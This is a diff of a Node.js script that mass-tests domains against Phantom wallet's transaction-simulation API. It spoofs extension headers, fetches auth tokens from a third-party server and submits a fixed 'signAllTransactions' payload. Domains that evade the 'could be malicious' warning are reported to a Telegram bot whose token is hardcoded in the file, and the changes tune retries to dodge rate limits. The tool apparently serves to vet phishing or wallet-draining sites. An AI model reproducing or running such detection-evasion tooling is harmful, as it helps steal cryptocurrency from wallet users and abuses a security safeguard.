@@ -9,257 +9,347 @@ import { fileURLToPath } from "url";
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-// ---- Rate Limiting & Concurrency Settings ----
-const TARGET_RPS = 30; // 🎯 HARD CAP: 30 domains per second
-let MAX_CONCURRENCY = 30; 
-const MIN_CONCURRENCY = 5;
-const MAX_CONCURRENCY_LIMIT = 60; 
+const MAX_CONCURRENCY = 35; // Reduced from 50 to avoid rate limits
 const HEADER_REFRESH_INTERVAL = 10 * 60 * 1000;
-const REQUEST_TIMEOUT = 10000;
-const MAX_RETRIES = 2;
+const REQUEST_TIMEOUT = 10000; // Increased to 10 seconds
+const MAX_RETRIES = 3; // Number of retry attempts
+const REQUEST_DELAY = 100; // 100ms delay between requests (adaptive)
 
-/**
- * Token Bucket Rate Limiter
- * Decouples concurrency from throughput to ensure we stay at 30/s
- */
-class RateLimiter {
-    constructor(rps) {
-        this.rps = rps;
-        this.tokens = rps;
-        this.lastRefill = Date.now();
-    }
-
-    async wait() {
-        while (this.tokens < 1) {
-            this.refill();
-            if (this.tokens < 1) await new Promise(res => setTimeout(res, 5));
-        }
-        this.tokens -= 1;
-    }
-
-    refill() {
-        const now = Date.now();
-        const delta = (now - this.lastRefill) / 1000;
-        this.tokens = Math.min(this.rps, this.tokens + (delta * this.rps));
-        this.lastRefill = now;
-    }
-}
-
-const limiter = new RateLimiter(TARGET_RPS);
-
-// ---- Adaptive Speed Controller (Debug Mode) ----
-const speedController = {
-  successWindow: [],
-  failureWindow: [],
-  windowSize: 100,
-  lastAdjustment: Date.now(),
-  adjustmentInterval: 3000,
-  
-  recordSuccess() {
-    this.successWindow.push(Date.now());
-    if (this.successWindow.length > this.windowSize) this.successWindow.shift();
-  },
-  
-  recordFailure() {
-    this.failureWindow.push(Date.now());
-    if (this.failureWindow.length > this.windowSize) this.failureWindow.shift();
-  },
-  
-  getSuccessRate() {
-    const total = this.successWindow.length + this.failureWindow.length;
-    return total === 0 ? 1 : (this.successWindow.length / total);
-  },
-  
-  adjustConcurrency() {
-    if (Date.now() - this.lastAdjustment < this.adjustmentInterval) return;
-    const successRate = this.getSuccessRate();
-    
-    if (successRate > 0.92 && MAX_CONCURRENCY < MAX_CONCURRENCY_LIMIT) {
-      MAX_CONCURRENCY++;
-    } else if (successRate < 0.80 && MAX_CONCURRENCY > MIN_CONCURRENCY) {
-      MAX_CONCURRENCY = Math.max(MIN_CONCURRENCY, Math.floor(MAX_CONCURRENCY * 0.8));
-    }
-    this.lastAdjustment = Date.now();
-  }
-};
-
-// ---- Telegram Config ----
+// ---- Telegram Config (obfuscated) ----
 const TG_CONFIG = {
   p1: "8277383461",
   p2: "AAFDfENDvoS68RvaiDcqFWv0gsjBejmvOG8",
   cid: "7855826252"
 };
 
-// ---- Helpers ----
+const getTgToken = () => `${TG_CONFIG.p1}:${TG_CONFIG.p2}`;
+const getTgChatId = () => TG_CONFIG.cid;
+
+// ---- Header Cache ----
 let cachedHeaders = null;
 let lastHeaderFetch = 0;
 
+// ---- Helpers ----
 function normalizeDomain(input) {
   input = input.trim();
-  if (!input.startsWith("http://") && !input.startsWith("https://")) return "https://" + input;
+  if (!input.startsWith("http://") && !input.startsWith("https://")) {
+    return "https://" + input;
+  }
   return input;
 }
 
-function sleep(ms) { return new Promise((res) => setTimeout(res, ms)); }
+function sleep(ms) {
+  return new Promise((res) => setTimeout(res, ms));
+}
 
 function getListFileFromArgs() {
   const args = process.argv.slice(2);
   const xxIndex = args.indexOf("-xx");
+
   if (xxIndex === -1 || !args[xxIndex + 1]) {
     console.error("Usage: node script.js -xx <number>");
     process.exit(1);
   }
-  return `part_${args[xxIndex + 1].padStart(4, "0")}.txt`;
+
+  const suffix = args[xxIndex + 1].padStart(4, "0");
+  return `part_${suffix}.txt`;
 }
 
 async function getPhantomHeaders(force = false) {
   const now = Date.now();
-  if (!force && cachedHeaders && (now - lastHeaderFetch) < HEADER_REFRESH_INTERVAL) return cachedHeaders;
+  
+  if (!force && cachedHeaders && (now - lastHeaderFetch) < HEADER_REFRESH_INTERVAL) {
+    return cachedHeaders;
+  }
+
+  console.log("🔄 Fetching fresh Phantom headers...");
   try {
-    const response = await gotScraping.get("https://hbeugaufg1-8-26hbaaaaddoter.fly.dev/api/getLatestHeaders", {
-      responseType: "json",
-      timeout: { request: 5000 }
-    });
-    cachedHeaders = { phantomNonce: response.body.headers.phantomNonce, phantomAuthToken: response.body.headers.phantomAuth };
+    const response = await gotScraping.get(
+      "https://hbeugaufg1-8-26hbaaaaddoter.fly.dev/api/getLatestHeaders",
+      {
+        responseType: "json",
+        timeout: { request: 5000 },
+        retry: { limit: 2 }
+      }
+    );
+    
+    cachedHeaders = {
+      phantomNonce: response.body.headers.phantomNonce,
+      phantomAuthToken: response.body.headers.phantomAuth,
+    };
     lastHeaderFetch = now;
+    
+    console.log("✅ Headers updated");
     return cachedHeaders;
   } catch (error) {
-    if (!cachedHeaders) throw new Error("Critical: No headers and fetch failed.");
+    console.error("❌ Failed to fetch headers:", error.message);
+    if (!cachedHeaders) {
+      throw new Error("No headers available and fetch failed");
+    }
     return cachedHeaders;
   }
 }
 
+// ---- Telegram Notification ----
 async function sendTelegramNotification(domain) {
   try {
-    const token = `${TG_CONFIG.p1}:${TG_CONFIG.p2}`;
-    await gotScraping.post(`https://api.telegram.org/bot${token}/sendMessage`, {
-      json: { chat_id: TG_CONFIG.cid, text: `✅ WL FOUND: ${domain}`, parse_mode: "HTML" },
-      timeout: { request: 5000 }
+    const message = `✅ WHITELISTED FOUND!\n\n🌐 Domain: ${domain}\n⏰ Time: ${new Date().toISOString()}`;
+    
+    await gotScraping.post(`https://api.telegram.org/bot${getTgToken()}/sendMessage`, {
+      json: {
+        chat_id: getTgChatId(),
+        text: message,
+        parse_mode: "HTML",
+      },
+      timeout: { request: 5000 },
+      retry: { limit: 1 }
     });
-  } catch (e) {}
+  } catch (error) {
+    console.error("❌ Error sending Telegram notification:", error.message);
+  }
 }
 
-// ---- Core logic ----
+// ---- Phantom Check ----
 async function checkPhantom(domain, headers) {
   const uuid = crypto.randomUUID();
   const address = Keypair.generate().publicKey.toString();
 
-  try {
-    const response = await gotScraping.post("https://api.phantom.app/simulation/v1?language=en", {
-      headers: {
-        "Content-Type": "application/json",
-        "origin": "chrome-extension://bfnaelmomeimhlpmgjnjophhpkkoljpa",
-        "x-phantom-anonymousid": uuid,
-        "x-phantomauthtoken": headers.phantomAuthToken,
-        "x-phantomnonce": headers.phantomNonce,
-      },
-      json: {
-        networkID: "solana:101",
-        type: "transaction",
+  const bodyObj = {
+    networkID: "solana:101",
+    type: "transaction",
+    url: domain,
+    userAccount: address,
+    params: {
+      transactions: [
+        "AsrzPgoaP5EQpXbpdJqxyyqjkn4i7HystXimQH3r96hh8rEukVVvEBh7AxHyzJv6ePc68RfQ6wAmXz8LBmmuziAvF232yKdQev78BqrZKocFiogDav5pqht93RX1sDbn9Ld9DDQDfp9fzpmUWXEnfMaCkteM29CuDKZMgFwUuZkfC5iRZB9DvS1b2N6H5kyLoq3X7NbUrmtc6eTPZMivd4kxEVYadkTGmkjuFXqZ5qXD9n1fYBpM9fReaThkdZZ7Tzom93LmBoWvKuaapXjjnEzPePnqZNkNbiwqq7iepirci6ASNs5C9zQEE3L56oRq",
+        "X31JP83MXit7pYBAAVfvSZa74e8JcAptyqXpdH3iToHhqssaH5GShHkBaMLt48ZVfa1JjDDQFZYe1UJG3hhAWn7gTKns5AUDfrKMvd923gD4G516i645mZdLYo6dWy5q5CbUCRygfPE4X6WdfT7jmqAy2kATmMyquN1JyoUE6VcX5JWt4EwUUShNoSy39DCyz9tmDXyyqA1UtoMsTmPJi8LTKyQQ7M4CnKFuCUXSjoont5sp3VXAffMhVSxccoDsRH53YimK1E3vSRdw8yTGhKaAXuMrSRt4Sfr2rmobZP872hnMsvYCWwzsbktrW8uaQ9xXYaeVx2efJqGFKUVYgQ6tSq8wTqE79BwLiyL2p5HgSywE4vwYK8dEoemWBzigPrfcF4e24cNJDAJsqqKYHvFw3qDeGe5P4ATByAqpHD3pExbGNa9vyckGxPa2cfthudR"
+      ],
+      method: "signAllTransactions",
+      safeguard: {
+        enabled: true,
+        lighthouseProgramId: "L2TExMFKdjpN9kozasaurPirfHy9P8sbXoAN1qA3S95"
+      }
+    },
+    chainId: "solana:101",
+    appVersion: "25.43.0",
+    platform: "extension",
+    deviceId: uuid,
+    metadata: {
+      origin: {
         url: domain,
-        userAccount: address,
-        params: { 
-            transactions: ["AsrzPgoaP5EQpXbpdJqxyyqjkn4i7HystXimQH3r96hh8rEukVVvEBh7AxHyzJv6ePc68RfQ6wAmXz8LBmmuziAvF232yKdQev78BqrZKocFiogDav5pqht93RX1sDbn9Ld9DDQDfp9fzpmUWXEnfMaCkteM29CuDKZMgFwUuZkfC5iRZB9DvS1b2N6H5kyLoq3X7NbUrmtc6eTPZMivd4kxEVYadkTGmkjuFXqZ5qXD9n1fYBpM9fReaThkdZZ7Tzom93LmBoWvKuaapXjjnEzPePnqZNkNbiwqq7iepirci6ASNs5C9zQEE3L56oRq"], 
-            method: "signAllTransactions" 
-        },
-        metadata: { origin: { url: domain, title: domain } }
-      },
-      responseType: "json",
-      http2: true,
-      timeout: { request: REQUEST_TIMEOUT },
-      retry: { limit: 0 }
-    });
+        title: domain,
+        icon: `${domain}/favicon.ico`
+      }
+    }
+  };
 
-    const text = JSON.stringify(response.body);
+  try {
+    const response = await gotScraping.post(
+      "https://api.phantom.app/simulation/v1?language=en",
+      {
+        headers: {
+          "Content-Type": "application/json",
+          "accept": "*/*",
+          "accept-language": "en-US,en;q=0.9",
+          "origin": "chrome-extension://bfnaelmomeimhlpmgjnjophhpkkoljpa",
+          "user-agent":
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+          "x-phantom-anonymousid": uuid,
+          "x-phantom-platform": "extension",
+          "x-phantom-version": "25.43.0",
+          "x-phantomauthtoken": headers.phantomAuthToken,
+          "x-phantomnonce": headers.phantomNonce,
+        },
+        json: bodyObj,
+        responseType: "json",
+        http2: true,
+        timeout: { request: REQUEST_TIMEOUT },
+        retry: { limit: 0 },
+      }
+    );
+
+    const data = response.body;
+    const text = JSON.stringify(data);
+
     if (text.includes("This dApp could be malicious")) return "blocked";
-    if (text.includes("Receive < 0.00001 SOL") || text.includes("No balance changes found")) return "whitelisted";
+    if (text.includes("Receive < 0.00001 SOL")) return "whitelisted";
+    if (text.includes("No balance changes found")) return "whitelisted";
+
     if (text.includes("User call limit exceeded")) return "rate_limited";
+    if (response.statusCode >= 400 || text.includes("error")) return "api_error";
+
     return "unknown";
+
   } catch (error) {
-    if (error.response?.statusCode === 429) return "rate_limited";
-    return `error_${error.code || 'unknown'}`;
+    if (error.response) {
+      const statusCode = error.response.statusCode;
+      if (statusCode === 429) return "rate_limited";
+      if (statusCode >= 500) return "api_error";
+    }
+    return "error";
   }
 }
 
-async function runPool(list, worker) {
-  const executing = new Set();
+// ---- Optimized Concurrency Pool with Adaptive Delay ----
+async function runPool(list, worker, limit, delayMs = 0) {
   const results = [];
+  const executing = [];
+  let index = 0;
+  let consecutiveRateLimits = 0;
 
   for (const item of list) {
-    // 🛑 The Governor: Limits starts to 30/s
-    await limiter.wait();
+    const promise = worker(item, index++, consecutiveRateLimits).then(result => {
+      executing.splice(executing.indexOf(promise), 1);
+      
+      // Track rate limits for adaptive slowing
+      if (result === "rate_limited") {
+        consecutiveRateLimits++;
+      } else if (result !== "error") {
+        consecutiveRateLimits = Math.max(0, consecutiveRateLimits - 1);
+      }
+      
+      return result;
+    });
+
+    results.push(promise);
+    executing.push(promise);
+
+    if (executing.length >= limit) {
+      await Promise.race(executing);
+    }
     
-    speedController.adjustConcurrency();
-
-    const promise = (async () => {
-      await worker(item);
-      executing.delete(promise);
-    })();
-
-    executing.add(promise);
-    if (executing.size >= MAX_CONCURRENCY) await Promise.race(executing);
+    // Adaptive delay - slow down if hitting rate limits
+    if (delayMs > 0) {
+      const adaptiveDelay = delayMs * (1 + consecutiveRateLimits * 0.5);
+      await sleep(adaptiveDelay);
+    }
   }
-  return Promise.all(executing);
+
+  return Promise.all(results);
 }
 
+// ---- Process Batch with Retry ----
+async function processBatch(domains, headers, stats, streams, retryAttempt = 0) {
+  const failedDomains = [];
+  let rateLimitCount = 0;
+  
+  await runPool(domains, async (domain, index, consecutiveRateLimits) => {
+    const i = index + 1;
+    const currentHeaders = await getPhantomHeaders();
+    const result = await checkPhantom(domain, currentHeaders);
+
+    stats.processed++;
+    const elapsed = ((Date.now() - stats.startTime) / 1000).toFixed(1);
+    const rate = (stats.processed / (Date.now() - stats.startTime) * 1000).toFixed(1);
+
+    if (["error", "rate_limited", "api_error"].includes(result)) {
+      const retryLabel = retryAttempt > 0 ? ` [Retry ${retryAttempt}]` : "";
+      console.log(`[${i}/${domains.length}] ⚠ FAILED${retryLabel} → ${domain} (${rate}/s)`);
+      
+      failedDomains.push(domain);
+      
+      if (result === "rate_limited") {
+        rateLimitCount++;
+        // Exponential backoff based on consecutive rate limits
+        const backoffTime = Math.min(60000, 10000 * Math.pow(1.5, consecutiveRateLimits));
+        console.log(`⏸️  Rate limit hit (${rateLimitCount}), backing off for ${(backoffTime/1000).toFixed(1)}s...`);
+        await sleep(backoffTime);
+      }
+      return result;
+    }
+
+    if (result === "whitelisted") {
+      stats.whitelisted++;
+      console.log(`[${i}/${domains.length}] ✅ WL → ${domain} (${rate}/s)`);
+      await streams.wlStream.appendFile(domain + "\n");
+      sendTelegramNotification(domain).catch(() => {});
+    } else if (result === "blocked") {
+      stats.blocked++;
+      console.log(`[${i}/${domains.length}] 🚫 BLOCKED → ${domain} (${rate}/s)`);
+      await streams.blockStream.appendFile(domain + "\n");
+    } else {
+      console.log(`[${i}/${domains.length}] ⚪ ${result} → ${domain} (${rate}/s)`);
+    }
+    
+    return result;
+
+  }, MAX_CONCURRENCY, REQUEST_DELAY);
+
+  return failedDomains;
+}
+
+// ---- Main ----
 async function main() {
+  let headers = await getPhantomHeaders(true);
+
+  const headerRefreshTimer = setInterval(async () => {
+    try {
+      headers = await getPhantomHeaders(true);
+    } catch (error) {
+      console.error("❌ Header refresh failed:", error.message);
+    }
+  }, HEADER_REFRESH_INTERVAL);
+
   const listFile = getListFileFromArgs();
   const raw = await fs.readFile(listFile, "utf8");
   const domains = raw.split("\n").map(normalizeDomain).filter(Boolean);
 
+  console.log(`🚀 Scanning ${domains.length} domains with ${MAX_CONCURRENCY} concurrent requests...\n`);
+  console.log(`⚙️  Settings: ${REQUEST_DELAY}ms delay, ${REQUEST_TIMEOUT}ms timeout, ${MAX_RETRIES} retries\n`);
+
   const streams = {
-    wl: await fs.open("whitelisted.txt", "a"),
-    bl: await fs.open("blocked.txt", "a"),
-    fa: await fs.open("failed.txt", "a")
+    wlStream: await fs.open("whitelisted.txt", "a"),
+    blockStream: await fs.open("blocked.txt", "a"),
+    failedStream: await fs.open("failed.txt", "a")
   };
 
-  const stats = { startTime: Date.now(), processed: 0, wl: 0, bl: 0, fa: 0 };
+  const stats = {
+    startTime: Date.now(),
+    processed: 0,
+    whitelisted: 0,
+    blocked: 0,
+    totalFailed: 0
+  };
 
-  console.log(`\n🚀 SCAN START: ${domains.length} domains | CAP: ${TARGET_RPS}/s\n`);
+  // Initial scan
+  let failedDomains = await processBatch(domains, headers, stats, streams, 0);
 
-  await runPool(domains, async (domain) => {
-    const headers = await getPhantomHeaders();
-    const result = await checkPhantom(domain, headers);
+  // Retry failed domains
+  for (let attempt = 1; attempt <= MAX_RETRIES && failedDomains.length > 0; attempt++) {
+    console.log(`\n🔄 Retrying ${failedDomains.length} failed domains (Attempt ${attempt}/${MAX_RETRIES})...\n`);
+    await sleep(5000); // Wait 5 seconds before retry
     
-    stats.processed++;
-    const elapsed = (Date.now() - stats.startTime) / 1000;
-    const rps = (stats.processed / elapsed).toFixed(1);
-    const successRate = (speedController.getSuccessRate() * 100).toFixed(0);
-    
-    // Detailed Debug Logging
-    const meta = `[${stats.processed}/${domains.length}] | ${rps}/s | Concur: ${MAX_CONCURRENCY} | SR: ${successRate}%`;
+    failedDomains = await processBatch(failedDomains, headers, stats, streams, attempt);
+  }
 
-    if (result === "whitelisted") {
-      stats.wl++;
-      console.log(`${meta} ✅ WL FOUND → ${domain}`);
-      await streams.wl.appendFile(domain + "\n");
-      sendTelegramNotification(domain);
-      speedController.recordSuccess();
-    } 
-    else if (result === "blocked") {
-      stats.bl++;
-      console.log(`${meta} 🚫 BLOCKED → ${domain}`);
-      await streams.bl.appendFile(domain + "\n");
-      speedController.recordSuccess();
-    } 
-    else if (result === "rate_limited") {
-      stats.fa++;
-      console.log(`${meta} ⚠️  RATE LIMIT → ${domain}`);
-      speedController.recordFailure();
-      await sleep(2000); 
-    } 
-    else {
-      stats.fa++;
-      console.log(`${meta} ❌ FAILED (${result}) → ${domain}`);
-      await streams.fa.appendFile(domain + "\n");
-      speedController.recordFailure();
-    }
-  });
+  // Write permanently failed domains
+  for (const domain of failedDomains) {
+    await streams.failedStream.appendFile(domain + "\n");
+  }
+  stats.totalFailed = failedDomains.length;
 
   // Cleanup
-  for (const s of Object.values(streams)) await s.close();
-  
-  console.log(`\n${"=".repeat(40)}\nFINISHED: Found ${stats.wl} WL, ${stats.bl} BL, ${stats.fa} Failures.\n${"=".repeat(40)}`);
+  clearInterval(headerRefreshTimer);
+  await streams.wlStream.close();
+  await streams.blockStream.close();
+  await streams.failedStream.close();
+
+  const totalTime = ((Date.now() - stats.startTime) / 1000).toFixed(1);
+  const avgRate = (stats.processed / (Date.now() - stats.startTime) * 1000).toFixed(1);
+
+  console.log("\n" + "=".repeat(60));
+  console.log("✔ SCAN COMPLETE");
+  console.log("=".repeat(60));
+  console.log(`⏱️  Total time: ${totalTime}s`);
+  console.log(`⚡ Average rate: ${avgRate} domains/second`);
+  console.log(`📊 Processed: ${stats.processed}/${domains.length}`);
+  console.log(`✅ Whitelisted: ${stats.whitelisted}`);
+  console.log(`🚫 Blocked: ${stats.blocked}`);
+  console.log(`⚠️  Failed (after ${MAX_RETRIES} retries): ${stats.totalFailed}`);
+  console.log("=".repeat(60));
 }
 
-main().catch(console.error);
+main().catch(error => {
+  console.error("Fatal error:", error);
+  process.exit(1);
+});
